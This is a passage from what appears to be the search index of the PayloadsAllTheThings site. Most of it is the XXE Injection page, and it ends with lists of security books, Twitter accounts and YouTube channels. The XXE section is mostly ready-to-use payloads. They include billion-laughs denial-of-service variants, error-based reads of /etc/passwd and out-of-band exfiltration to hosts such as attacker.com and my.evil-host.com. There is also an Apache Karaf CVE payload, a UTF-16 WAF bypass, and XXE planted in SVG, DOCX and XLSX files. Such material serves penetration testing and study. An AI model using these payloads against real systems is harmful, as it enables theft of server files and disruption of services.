[*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: &amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\ne: &amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\nf: &amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\ng: &amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\nh: &amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\ni: &amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h]\n</code></pre>"},{"location":"XXE%20Injection/#parameters-laugh-attack","title":"Parameters Laugh attack","text":"<p>A variant of the Billion Laughs attack, using delayed interpretation of parameter entities, by Sebastian Pipping.</p> <pre><code>&lt;!DOCTYPE r [\n  &lt;!ENTITY % pe_1 \"&lt;!----&gt;\"&gt;\n  &lt;!ENTITY % pe_2 \"&amp;#37;pe_1;&lt;!----&gt;&amp;#37;pe_1;\"&gt;\n  &lt;!ENTITY % pe_3 \"&amp;#37;pe_2;&lt;!----&gt;&amp;#37;pe_2;\"&gt;\n  &lt;!ENTITY % pe_4 \"&amp;#37;pe_3;&lt;!----&gt;&amp;#37;pe_3;\"&gt;\n  %pe_4;\n]&gt;\n&lt;r/&gt;\n</code></pre>"},{"location":"XXE%20Injection/#exploiting-error-based-xxe","title":"Exploiting Error Based XXE","text":"<p>Payload to trigger the XXE</p> <pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;!DOCTYPE message [\n    &lt;!ENTITY % ext SYSTEM \"http://attacker.com/ext.dtd\"&gt;\n%ext;\n]&gt;\n&lt;message&gt;&lt;/message&gt;\n</code></pre> <p>Contents of ext.dtd</p> <pre><code>&lt;!ENTITY % file SYSTEM \"file:///etc/passwd\"&gt;\n&lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;\"&gt;\n%eval;\n%error;\n</code></pre>"},{"location":"XXE%20Injection/#exploiting-blind-xxe-to-exfiltrate-data-out-of-band","title":"Exploiting blind XXE to exfiltrate data out-of-band","text":"<p>Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.</p>"},{"location":"XXE%20Injection/#basic-blind-xxe","title":"Basic Blind XXE","text":"<p>The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.</p> <pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;!DOCTYPE root [\n&lt;!ENTITY % ext SYSTEM \"http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x\"&gt; %ext;\n]&gt;\n&lt;r&gt;&lt;/r&gt;\n</code></pre> <p>Send the content of <code>/etc/passwd</code> to \"www.malicious.com\", you may receive only the first line.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY % xxe SYSTEM \"file:///etc/passwd\" &gt;\n&lt;!ENTITY callhome SYSTEM \"www.malicious.com/?%xxe;\"&gt;\n]\n&gt;\n&lt;foo&gt;&amp;callhome;&lt;/foo&gt;\n</code></pre>"},{"location":"XXE%20Injection/#xxe-oob-attack-yunusov-2013","title":"XXE OOB Attack (Yunusov, 2013)","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE data SYSTEM \"http://publicServer.com/parameterEntity_oob.dtd\"&gt;\n&lt;data&gt;&amp;send;&lt;/data&gt;\nFile stored on http://publicServer.com/parameterEntity_oob.dtd\n&lt;!ENTITY % file SYSTEM \"file:///sys/power/image_size\"&gt;\n&lt;!ENTITY % all \"&lt;!ENTITY send SYSTEM 'http://publicServer.com/?%file;'&gt;\"&gt;\n%all;\n</code></pre>"},{"location":"XXE%20Injection/#xxe-oob-with-dtd-and-php-filter","title":"XXE OOB with DTD and PHP filter","text":"<pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY % sp SYSTEM \"http://127.0.0.1/dtd.xml\"&gt;\n%sp;\n%param1;\n]&gt;\n&lt;r&gt;&amp;exfil;&lt;/r&gt;\nFile stored on http://127.0.0.1/dtd.xml\n&lt;!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt;\n&lt;!ENTITY % param1 \"&lt;!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'&gt;\"&gt;\n</code></pre>"},{"location":"XXE%20Injection/#xxe-oob-with-apache-karaf","title":"XXE OOB with Apache Karaf","text":"<p>CVE-2018-11788 affecting versions:</p> <ul> <li>Apache Karaf &lt;= 4.2.1</li> <li>Apache Karaf &lt;= 4.1.6</li> </ul> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM \"http://27av6zyg33g8q8xu338uvhnsc.canarytokens.com\"&gt; %dtd;]\n&lt;features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\nxsi:schemaLocation=\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\"&gt;\n&lt;feature name=\"deployer\" version=\"2.0\" install=\"auto\"&gt;\n&lt;/feature&gt;\n&lt;/features&gt;\n</code></pre> <p>Send the XML file to the <code>deploy</code> folder.</p> <p>Ref. brianwrf/CVE-2018-11788</p>"},{"location":"XXE%20Injection/#xxe-with-local-dtd","title":"XXE with local DTD","text":"<p>In some case, outgoing connections are not possible from the web application. DNS names might even not resolve externally with a payload like this: <pre><code>&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'http://h3l9e5soi0090naz81tmq5ztaaaaaa.burpcollaborator.net'&gt;]&gt;\n&lt;root&gt;&amp;test;&lt;/root&gt;\n</code></pre></p> <p>If error based exfiltration is possible, you can still rely on a local DTD to do concatenation tricks. Payload to confirm that error message include filename.</p> <pre><code>&lt;!DOCTYPE root [\n    &lt;!ENTITY % local_dtd SYSTEM \"file:///abcxyz/\"&gt;\n%local_dtd;\n]&gt;\n&lt;root&gt;&lt;/root&gt;\n</code></pre> <p>Assuming payloads such as the previous return a verbose error. You can start pointing to local DTD. With an found DTD, you can submit payload such as the following payload. The content of the file will be place in the error message.</p> <pre><code>&lt;!DOCTYPE root [\n    &lt;!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"&gt;\n&lt;!ENTITY % ISOamsa '\n        &lt;!ENTITY &amp;#x25; file SYSTEM \"file:///REPLACE_WITH_FILENAME_TO_READ\"&gt;\n&lt;!ENTITY &amp;#x25; eval \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;\"&gt;\n        &amp;#x25;eval;\n        &amp;#x25;error;\n        '&gt;\n\n%local_dtd;\n]&gt;\n&lt;root&gt;&lt;/root&gt;\n</code></pre>"},{"location":"XXE%20Injection/#cisco-webex","title":"Cisco WebEx","text":"<pre><code>&lt;!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd\"&gt;\n&lt;!ENTITY % url.attribute.set '&gt;Your DTD code&lt;!ENTITY test \"test\"'&gt;\n%local_dtd;\n</code></pre>"},{"location":"XXE%20Injection/#citrix-xenmobile-server","title":"Citrix XenMobile Server","text":"<p><pre><code>&lt;!ENTITY % local_dtd SYSTEM \"jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd\"&gt;\n&lt;!ENTITY % Body '&gt;Your DTD code&lt;!ENTITY test \"test\"'&gt;\n%local_dtd;\n</code></pre> Other payloads using different DTDs</p>"},{"location":"XXE%20Injection/#waf-bypasses","title":"WAF Bypasses","text":""},{"location":"XXE%20Injection/#bypass-via-character-encoding","title":"Bypass via character encoding","text":"<p>XML parsers uses 4 methods to detect encoding: * HTTP Content Type: <code>Content-Type: text/xml; charset=utf-8</code> * Reading Byte Order Mark (BOM) * Reading first symbols of document      * UTF-8 (3C 3F 78 6D)     * UTF-16BE (00 3C 00 3F)     * UTF-16LE (3C 00 3F 00) * XML declaration: <code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;</code></p> Encoding BOM Example UTF-8 EF BB BF EF BB BF 3C 3F 78 6D 6C ...&lt;?xml UTF-16BE FE FF FE FF 00 3C 00 3F 00 78 00 6D 00 6C ...&lt;.?.x.m.l UTF-16LE FF FE FF FE 3C 00 3F 00 78 00 6D 00 6C 00 ..&lt;.?.x.m.l. <p>Example: We can convert the payload to <code>UTF-16</code> using iconv to bypass some WAF:</p> <pre><code>cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE &gt; utf16exploit.xml\n</code></pre>"},{"location":"XXE%20Injection/#xxe-in-java","title":"XXE in Java","text":"<p>Unsecure configuration in 10 different Java classes from three XML processing interfaces (DOM, SAX, StAX) that can lead to XXE:</p> <p></p> <ul> <li>DocumentBuilderFactory (javax.xml.parsers.DocumentBuilderFactory)</li> <li>SAXBuilder (org.jdom2.input.SAXBuilder)</li> <li>SAXParserFactory (javax.xml.parsers.SAXParserFactory)</li> <li>SAXParser (javax.xml.parsers.SAXParser )</li> <li>SAXReader (org.dom4j.io.SAXReader)</li> <li>TransformerFactory (javax.xml.transform.TransformerFactory) &amp; SAXTransformerFactory (javax.xml.transform.sax.SAXTransformerFactory)</li> <li>SchemaFactory (javax.xml.validation.SchemaFactory)</li> <li>Validator (javax.xml.validation.Validator)</li> <li>XMLReader (org.xml.sax.XMLReader)</li> </ul> <p>Ref.</p> <ul> <li>Semgrep - XML Security in Java</li> <li>Semgrep - XML External entity prevention for Java</li> </ul>"},{"location":"XXE%20Injection/#xxe-in-exotic-files","title":"XXE in exotic files","text":""},{"location":"XXE%20Injection/#xxe-inside-svg","title":"XXE inside SVG","text":"<pre><code>&lt;svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\"&gt;\n&lt;image xlink:href=\"expect://ls\" width=\"200\" height=\"200\"&gt;&lt;/image&gt;\n&lt;/svg&gt;\n</code></pre> <p>Classic</p> <pre><code>&lt;?xml version=\"1.0\" standalone=\"yes\"?&gt;\n&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:///etc/hostname\" &gt; ]&gt;\n&lt;svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"&gt;\n&lt;text font-size=\"16\" x=\"0\" y=\"16\"&gt;&amp;xxe;&lt;/text&gt;\n&lt;/svg&gt;\n</code></pre> <p>OOB via SVG rasterization</p> <p>xxe.svg</p> <pre><code>&lt;?xml version=\"1.0\" standalone=\"yes\"?&gt;\n&lt;!DOCTYPE svg [\n&lt;!ELEMENT svg ANY &gt;\n&lt;!ENTITY % sp SYSTEM \"http://example.org:8080/xxe.xml\"&gt;\n%sp;\n%param1;\n]&gt;\n&lt;svg viewBox=\"0 0 200 200\" version=\"1.2\" xmlns=\"http://www.w3.org/2000/svg\" style=\"fill:red\"&gt;\n&lt;text x=\"15\" y=\"100\" style=\"fill:black\"&gt;XXE via SVG rasterization&lt;/text&gt;\n&lt;rect x=\"0\" y=\"0\" rx=\"10\" ry=\"10\" width=\"200\" height=\"200\" style=\"fill:pink;opacity:0.7\"/&gt;\n&lt;flowRoot font-size=\"15\"&gt;\n&lt;flowRegion&gt;\n&lt;rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" style=\"fill:red;opacity:0.3\"/&gt;\n&lt;/flowRegion&gt;\n&lt;flowDiv&gt;\n&lt;flowPara&gt;&amp;exfil;&lt;/flowPara&gt;\n&lt;/flowDiv&gt;\n&lt;/flowRoot&gt;\n&lt;/svg&gt;\n</code></pre> <p>xxe.xml</p> <pre><code>&lt;!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\"&gt;\n&lt;!ENTITY % param1 \"&lt;!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'&gt;\"&gt;\n</code></pre>"},{"location":"XXE%20Injection/#xxe-inside-soap","title":"XXE inside SOAP","text":"<pre><code>&lt;soap:Body&gt;\n&lt;foo&gt;\n&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM \"http://x.x.x.x:22/\"&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;\n&lt;/foo&gt;\n&lt;/soap:Body&gt;\n</code></pre>"},{"location":"XXE%20Injection/#xxe-inside-docx-file","title":"XXE inside DOCX file","text":"<p>Format of an Open XML file (inject the payload in any .xml file):</p> <ul> <li>/_rels/.rels</li> <li>[Content_Types].xml</li> <li>Default Main Document Part</li> <li>/word/document.xml</li> <li>/ppt/presentation.xml</li> <li>/xl/workbook.xml</li> </ul> <p>Then update the file <code>zip -u xxe.docx [Content_Types].xml</code></p> <p>Tool : https://github.com/BuffaloWill/oxml_xxe</p> <pre><code>DOCX/XLSX/PPTX\nODT/ODG/ODP/ODS\nSVG\nXML\nPDF (experimental)\nJPG (experimental)\nGIF (experimental)\n</code></pre>"},{"location":"XXE%20Injection/#xxe-inside-xlsx-file","title":"XXE inside XLSX file","text":"<p>Structure of the XLSX:</p> <pre><code>$ 7z l xxe.xlsx\n[...]\n   Date      Time    Attr         Size   Compressed  Name\n------------------- ----- ------------ ------------  ------------------------\n2021-10-17 15:19:00 .....          578          223  _rels/.rels\n2021-10-17 15:19:00 .....          887          508  xl/workbook.xml\n2021-10-17 15:19:00 .....         4451          643  xl/styles.xml\n2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml\n2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels\n2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml\n2021-10-17 15:19:00 .....          731          352  docProps/core.xml\n2021-10-17 15:19:00 .....          410          246  docProps/app.xml\n2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml\n------------------- ----- ------------ ------------  ------------------------\n2021-10-17 15:19:00              11216         3586  9 files\n</code></pre> <p>Extract Excel file: <code>7z x -oXXE xxe.xlsx</code></p> <p>Rebuild Excel file:</p> <pre><code>$ cd XXE\n$ 7z u ../xxe.xlsx *\n</code></pre> <p>Add your blind XXE payload inside <code>xl/workbook.xml</code>.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;\n&lt;!DOCTYPE cdl [&lt;!ELEMENT cdl ANY &gt;&lt;!ENTITY % asd SYSTEM \"http://x.x.x.x:8000/xxe.dtd\"&gt;%asd;%c;]&gt;\n&lt;cdl&gt;&amp;rrr;&lt;/cdl&gt;\n&lt;workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"&gt;\n</code></pre> <p>Alternativly, add your payload in <code>xl/sharedStrings.xml</code>:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;\n&lt;!DOCTYPE cdl [&lt;!ELEMENT t ANY &gt;&lt;!ENTITY % asd SYSTEM \"http://x.x.x.x:8000/xxe.dtd\"&gt;%asd;%c;]&gt;\n&lt;sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"10\" uniqueCount=\"10\"&gt;&lt;si&gt;&lt;t&gt;&amp;rrr;&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;testA2&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;testA3&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;testA4&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;testA5&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;testB1&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;testB2&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;testB3&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;testB4&lt;/t&gt;&lt;/si&gt;&lt;si&gt;&lt;t&gt;testB5&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;\n</code></pre> <p>Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file. Instead we build the document once and then change the DTD. And using FTP instead of HTTP allows to retrieve much larger files.</p> <p><code>xxe.dtd</code></p> <pre><code>&lt;!ENTITY % d SYSTEM \"file:///etc/passwd\"&gt;\n&lt;!ENTITY % c \"&lt;!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'&gt;\"&gt; </code></pre> <p>Serve DTD and receive FTP payload using xxeserv:</p> <pre><code>$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000\n</code></pre>"},{"location":"XXE%20Injection/#xxe-inside-dtd-file","title":"XXE inside DTD file","text":"<p>Most XXE payloads detailed above require control over both the DTD or <code>DOCTYPE</code> block as well as the <code>xml</code> file. In rare situations, you may only control the DTD file and won't be able to modify the <code>xml</code> file. For example, a MITM. When all you control is the DTD file, and you do not control the <code>xml</code> file, XXE may still be possible with this payload.</p> <pre><code>&lt;!-- Load the contents of a sensitive file into a variable --&gt;\n&lt;!ENTITY % payload SYSTEM \"file:///etc/passwd\"&gt;\n&lt;!-- Use that variable to construct an HTTP get request with the file contents in the URL --&gt;\n&lt;!ENTITY % param1 '&lt;!ENTITY &amp;#37; external SYSTEM \"http://my.evil-host.com/x=%payload;\"&gt;'&gt;\n%param1;\n%external;\n</code></pre>"},{"location":"XXE%20Injection/#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents","title":"Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents","text":"<p>From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79</p>"},{"location":"XXE%20Injection/#disclose-local-file","title":"Disclose local file","text":"<pre><code>&lt;!DOCTYPE doc [\n    &lt;!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\"&gt;\n&lt;!ENTITY % SuperClass '&gt;\n&lt;!ENTITY &amp;#x25; file SYSTEM \"file://D:\\webserv2\\services\\web.config\"&gt;\n&lt;!ENTITY &amp;#x25; eval \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file://t/#&amp;#x25;file;&amp;#x27;&gt;\"&gt;\n        &amp;#x25;eval;\n        &amp;#x25;error;\n      &lt;!ENTITY test \"test\"'\n    &gt;\n%local_dtd;\n  ]&gt;&lt;xxx&gt;cacat&lt;/xxx&gt;\n</code></pre>"},{"location":"XXE%20Injection/#disclose-http-response","title":"Disclose HTTP Response:","text":"<pre><code>&lt;!DOCTYPE doc [\n    &lt;!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\"&gt;\n&lt;!ENTITY % SuperClass '&gt;\n&lt;!ENTITY &amp;#x25; file SYSTEM \"https://erp.company.com\"&gt;\n&lt;!ENTITY &amp;#x25; eval \"&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file://test/#&amp;#x25;file;&amp;#x27;&gt;\"&gt;\n        &amp;#x25;eval;\n        &amp;#x25;error;\n      &lt;!ENTITY test \"test\"'\n    &gt;\n%local_dtd;\n  ]&gt;&lt;xxx&gt;cacat&lt;/xxx&gt;\n</code></pre>"},{"location":"XXE%20Injection/#references","title":"References","text":"<ul> <li>XML External Entity (XXE) Processing - OWASP</li> <li>XML External Entity Prevention Cheat Sheet</li> <li>Detecting and exploiting XXE in SAML Interfaces - 6. Nov. 2014 - Von Christian Mainka</li> <li>[Gist] staaldraad - XXE payloads</li> <li>[Gist] mgeeky - XML attacks</li> <li>Exploiting xxe in file upload functionality - BLACKHAT WEBCAST - 11/19/15 - Will Vandevanter - @will_is</li> <li>XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer)</li> <li>From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele</li> <li>How we got read access on Google\u2019s production servers April 11, 2014 by  detectify</li> <li>Blind OOB XXE At UBER 26+ Domains Hacked August 05, 2016 by Raghav Bisht</li> <li>OOB XXE through SAML by Sean Melia @seanmeals</li> <li>XXE in Uber to read local files 01/2017</li> <li>XXE inside SVG JUNE 22, 2016 by YEO QUAN YANG</li> <li>Pentest XXE - @phonexicum</li> <li>Exploiting XXE with local DTD files - 12/12/2018 - Arseniy Sharoglazov</li> <li>Web Security Academy &gt;&gt; XML external entity (XXE) injection - 2019 PortSwigger Ltd</li> <li>Automating local DTD discovery for XXE exploitation - July 16 2019 by Philippe Arteau</li> <li>EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN</li> <li>excel-reader-xlsx #10</li> <li>Midnight Sun CTF 2019 Quals - Rubenscube</li> <li>SynAck - A Deep Dive into XXE Injection - 22 July 2019 - Trenton Gordon</li> <li>Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK</li> <li>XXE: How to become a Jedi - Zeronights 2017 - Yaroslav Babin</li> <li>Payloads for Cisco and Citrix - Arseniy Sharoglazov</li> </ul>"},{"location":"_LEARNING_AND_SOCIALS/BOOKS/","title":"Books","text":"<p>Grab a book and relax. Some of the best books in the industry.</p> <ul> <li>Advanced Penetration Testing: Hacking the World's Most Secure Networks by Wil Allsopp (2017)</li> <li>Android Hacker's Handbook by Joshua J. Drake et al. (2014)</li> <li>Android Security Internals: An In-Depth Guide to Android's Security Architecture by Nikolay Elenkov (2015)</li> <li>Attacking Network Protocols: A Hacker's Guide to Capture, Analysis, and Exploitation by James Forshaw (2018)</li> <li>Black Hat Go: Go Programming for Hackers and Pentesters by Tom Steele, Chris Patten, and Dan Kottmann (2020)</li> <li>Black Hat Python: Python Programming for Hackers and Pentesters by Justin Seitz (2014)</li> <li>Breaking into Information Security: Learning the Ropes 101 - Andrew Gill</li> <li>Car Hacker's Handbook by Craig Smith (2016)</li> <li>Cyberjutsu: Cybersecurity for the Modern Ninja by Ben McCarty (2021)</li> <li>Foundations of Information Security: A Straightforward Introduction by Jason Andress (2019)</li> <li>Game Hacking: Developing Autonomous Bots for Online Games by Nick Cano (2016)</li> <li>Gray Hat Python: Python Programming for Hackers and Reverse Engineers by Justin Seitz (2009)</li> <li>Hacking: The Art of Exploitation by Jon Erickson (2004)</li> <li>iOS Hacker's Handbook by Charlie Miller et al. (2012)</li> <li>Metasploit: The Penetration Tester's Guide by David Kennedy (2011)</li> <li>OWASP Testing Guide: Stable</li> <li>Penetration Testing: A Hands-On Introduction to Hacking by Georgia Weidman (2014)</li> <li>Pentesting Azure Applications: The Definitive Guide to Testing and Securing  Deployments by Matt Burrough (2018)</li> <li>Practical Binary Analysis: Build Your Own Linux Tools for Binary instrumentation, Analysis, and Disassembly by Dennis Andriesse (2019)</li> <li>Practical Forensic Imaging: Securing Digital Evidence with Linux Tools by Bruce Nikkel (2016)</li> <li>Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things by Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou and Beau Woods (2021)</li> <li>Practical Doomsday: A User's Guide to the End of the World by Michal Zalewski (2022)</li> <li>Practical Social Engineering: A Primer for the Ethical Hacker by Joe Gray (2022)</li> <li>Real-World Bug Hunting: A Field Guide to Web Hacking by Peter Yaworski (2019)</li> <li>Rootkits and Bootkits: Reversing Modern Malware and Next Generation Threats by Alex Matrosov, Eugene Rodionov, and Sergey Bratus (2019)</li> <li>The Art of Cyberwarfare: An Investigator's Guide to Espionage, Ransomware, and Organized Cybercrime by Jon DiMaggio (2022)</li> <li>The Car Hacker's Handbook: A Guide for the Penetration Tester by Craig Smith (2016)</li> <li>The Browser Hacker's Handbook by Wade Alcorn et al. (2014)</li> <li>The Database Hacker's Handbook, David Litchfield et al. (2005)</li> <li>The Hacker Playbook: Practical Guide To Penetration Testing by Peter Kim (2014)</li> <li>The Hacker Playbook 2: Practical Guide to Penetration Testing by Peter Kim (2015)</li> <li>The Hacker Playbook 3: Practical Guide to Penetration Testing (Red Team Edition) by Peter Kim (2018)</li> <li>The Mac Hacker's Handbook by Charlie Miller &amp; Dino Dai Zovi (2009)</li> <li>The Hardware Hacking Handbook by Jasper van Woudenberg &amp; Colin O'Flynn (2022)</li> <li>The Mobile Application Hacker's Handbook by Dominic Chell et al. (2015)</li> <li>The Shellcoders Handbook by Chris Anley et al. (2007)</li> <li>The Web Application Hackers Handbook by D. Stuttard, M. Pinto (2011)</li> <li>Violent Python: A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers by T.J. O'Connor (2012)</li> <li>Web Hacking 101</li> </ul>"},{"location":"_LEARNING_AND_SOCIALS/TWITTER/","title":"Twitter","text":"<p>Twitter is very common in the InfoSec area. Many advices and tips on bug hunting or CTF games are posted every day. It is worth following the feeds of some successful security researchers and hackers. </p>"},{"location":"_LEARNING_AND_SOCIALS/TWITTER/#accounts","title":"Accounts","text":"<ul> <li>@St\u00f6k - Bug bounty hunter, cybersecurity educational content creator</li> <li>@NahamSec - Hacker &amp; content creator &amp; co-founder bugbountyforum and http://recon.dev</li> <li>@dawgyg - Bug bounty hunter, reformed blackhat, Synack red team member</li> <li>@putsi - Bug bounty hunter and white hat hacker in Team ROT</li> <li>@thecybermentor - Offers cybersecurity and hacking courses</li> <li>@InsiderPhD - PhD student, occasional bug bounty hunter &amp; educational cyber security youtuber</li> <li>@LiveOverflow - Content creator and hacker producing videos on various IT security topics and participating in hacking contests</li> <li>@EdOverflow - Web developer, security researcher and triager for numerous vulnerability disclosure programs</li> <li>@r0bre - Bug Hunter for web- and systemsecurity, iOS Security researcher</li> <li>@intigriti - European ethical hacking &amp; bug bounty platform</li> <li>@Hacker0x01 - American bug bounty platform</li> <li>@bugcrowd - Another american bug bounty platform</li> <li>@hakluke - Bug bounty hunter, content creator, creator of some great pentesting tools like hakrawler</li> <li>@spaceraccoon - Security researcher and white hat hacker. Has worked on several bug bounty programs</li> <li>@samwcyo - Full time bug bounty hunter</li> <li>@Th3G3nt3lman - Security Reasearch &amp; Bug bounty hunter</li> <li>@securinti - Dutch bug bounty hunter &amp; head of hackers and bord member @ intigriti</li> <li>@jobertabma - Co-founder of HackerOne, security researcher</li> <li>@codingo_ - Global Head of Security Ops and Researcher Enablement bugcrowd, Maintainer of some great pentesting tools like NoSQLMap or VHostScan</li> <li>@TomNomNom - security researcher, maintainer of many very useful pentesting tools</li> <li>@orange_8361 - bug bounty hunter and security researcher, specialized on RCE bugs</li> <li>@d0nutptr - part-time bug hunter, Lead Security Engineer at graplsec</li> <li>@filedescriptor - security researcher, bug hunter and content creator at 0xReconless</li> <li>@0xReconless - Security research, blogs, and videos by filedescriptor, ngalongc &amp; EdOverflow</li> <li>@pentest_swissky - Author of PayloadsAllTheThings &amp; SSRFmap</li> <li>@GentilKiwi - Author of Mimikatz &amp; Kekeo</li> </ul>"},{"location":"_LEARNING_AND_SOCIALS/YOUTUBE/","title":"Youtube","text":""},{"location":"_LEARNING_AND_SOCIALS/YOUTUBE/#channels","title":"Channels","text":"<ul> <li>IppSec Channel - Hack The Box Writeups</li> <li>LiveOverflow - Explore weird machines...</li> <li>GynvaelEN - Podcasts about CTFs, computer security, programing and similar things.</li> <li>John Hammond - Wargames and CTF writeups</li> <li>Murmus CTF - Weekly live streamings</li> <li>PwnFunction</li> <li>OJ Reeves</li> <li>Hacksplained - A Beginner Friendly Guide to Hacking</li> <li>ST\u00d6K</li> <li>Hackersploit</li> <li>The Cyber Mentor</li> <li>Nahamsec</li> <li>Hackerone</li> <li>The Hated one</li> <li>stacksmashing / Ghidra Ninja</li> <li> <p>Hak5</p> </li> <li> <p>HACKING GOOGLE Series</p> <ul> <li>EP000: Operation Aurora | HACKING GOOGLE</li> <li>EP001: Threat Analysis Group | HACKING GOOGLE</li> <li>EP002: Detection and Response | HACKING GOOGLE</li> <li>EP003: Red Team | HACKING GOOGLE</li> <li>EP004: Bug Hunters | HACKING GOOGLE</li> <li>EP005: Project Zero | HACKING GOOGLE</li> </ul> </li> </ul>"},{"location":"_LEARNING_AND_SOCIALS/YOUTUBE/#conferences","title":"Conferences","text":"<ul> <li>Hunting for Top Bounties - Nicolas Gr\u00e9goire</li> <li>BSidesSF 101 The Tales of a Bug Bounty Hunter - Arne Swinnen</li> <li>Security Fest 2016 The Secret life of a Bug Bounty Hunter - Frans Ros\u00e9n</li> <li>The Conscience of a Hacker</li> <li>Defcon Conference</li> <li>x33fcon Conference</li> <li>Hack In Paris</li> <li>LeHack / HZV</li> </ul>"},{"location":"_template_vuln/","title":"Vulnerability Title","text":"<p>Vulnerability description - reference</p>"},{"location":"_template_vuln/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Something</li> <li>Subentry 1</li> <li>Subentry 2</li> </ul>"},{"location":"_template_vuln/#tools","title":"Tools","text":"<ul> <li>Tool 1</li> <li>Tool 2</li> </ul>"},{"location":"_template_vuln/#something","title":"Something","text":"<p>Quick explanation</p> <pre><code>Exploit\n</code></pre>"},{"location":"_template_vuln/#references","title":"References","text":"<ul> <li>Blog title - Author, Date</li> </ul>"}]}